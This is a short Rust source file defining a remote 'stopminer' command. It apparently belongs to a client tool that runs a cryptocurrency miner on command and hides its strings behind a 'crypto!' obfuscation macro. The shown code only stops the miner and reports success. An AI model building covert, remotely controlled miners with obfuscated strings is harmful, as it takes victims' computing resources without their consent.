use super::prelude::*;

pub struct Stopminer;

#[async_trait]
impl Command for Stopminer {
    fn name(&self) -> String {
        crypto!("stopminer")
    }

    fn help(&self) -> String {
        crypto!("help")
    }

    fn min_args(&self) -> usize {
        0
    }

    // Use
    // ok(message) when command executed succesfully
    // error(message) when command executed failed.
    // This added error code which will be recognized by WPKG CLI
    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        crypto::stop_miner()?;
        client.send(ok(crypto!("Minerhas been stopped")))
    }
}
